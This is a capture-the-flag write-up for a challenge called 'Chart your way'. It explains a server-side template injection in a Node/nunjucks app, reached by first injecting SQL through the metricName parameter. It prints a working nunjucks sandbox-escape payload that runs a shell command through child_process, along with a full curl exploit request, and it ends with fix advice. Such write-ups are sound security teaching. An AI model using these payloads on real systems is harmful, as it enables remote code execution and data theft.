# Chart your way

## Vulnerability
This is a Server Side Template Injection.

In `chart_your_way/node/app/controllers/chartController.js` a user controlled variable called `metricName` is being used to build the template.
This template is evaluated on the server side by `nunjucks`, before returning the static HTML page to the client.

## Exploitation
The service is very simple: it takes a metricName in input, contacts a Database to retrieve the associated metrics and return them to the client.

As we only have one input, we focus on where it is used, and we notice it is directly included in a template that will be rendered on the server side by nunjucks.
Nunjucks is susceptible to SSTI (Server Side Template Injection), example of payload to test if a service is vulnerable can be found on [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

In our case for the template to be rendered we must first ensure the SQL query will be executed successfully.
We will start with a SQL injection to take control of the SQL query by calling the metricName: `1 as value FROM data FORMAT JSON; -- This comment can be used to exploit the SSTI`

One way to test it is by calling the metric `1 as value FROM data FORMAT JSON; -- {{7*7}}`.
The generated templates says our metric name is `# of 1 as value FROM data FORMAT JSON; -- 49'`, yes!

Let's now use the known vulnerability of nunjuck to read the flag.
Metric name: `1 as value FROM data FORMAT JSON; --{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag')")()}}`
```bash
curl 'http://localhost:1337/?metric_name=1%20as%20value%20FROM%20data%20FORMAT%20JSON;%20--\{\{range.constructor(%22return%20global.process.mainModule.require(%27child_process%27).execSync(%27cat%20/flag%27)%22)()\}\}'
```

## Fix
User input should be escaped before being used in templates.
The web server could also hardcode a list of available metrics and return an error if the user input contains an unknown metric name.
